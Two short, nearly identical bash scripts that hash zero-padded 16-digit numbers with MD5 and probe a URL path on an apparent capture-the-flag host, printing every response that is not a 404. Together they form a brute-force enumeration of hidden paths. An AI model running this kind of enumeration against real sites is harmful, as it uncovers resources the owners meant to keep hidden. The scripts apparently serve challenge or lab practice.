#!/bin/bash
BASE="https://chl-5a88a160-d2f2-43ca-bf38-b6289845ac18-apagar-ia.softwareseguro.com.ar/codes"
while read n; do
  cand=$(printf "%016d" "$n")          # rellena con ceros a la izquierda hasta 16 digitos
  h=$(printf "%s" "$cand" | md5sum | cut -d' ' -f1)
  code=$(curl -s -L -o /dev/null -w "%{http_code}" "$BASE/$h/")
  echo "$cand -> $code"
done < numeros.txt | grep -v 404



#!/bin/bash
BASE="https://chl-5a88a160-d2f2-43ca-bf38-b6289845ac18-apagar-ia.softwareseguro.com.ar/codes"
while read n; do
  [ -z "$n" ] && continue
  cand=$(printf "%016d" "$n" 2>/dev/null)
  [ -z "$cand" ] && continue
  h=$(printf "%s" "$cand" | md5sum | cut -d' ' -f1)
  code=$(curl -s -L -o /dev/null -w "%{http_code}" "$BASE/$h/")
  echo "$cand -> $code"
done < numeros.txt | grep -v 404
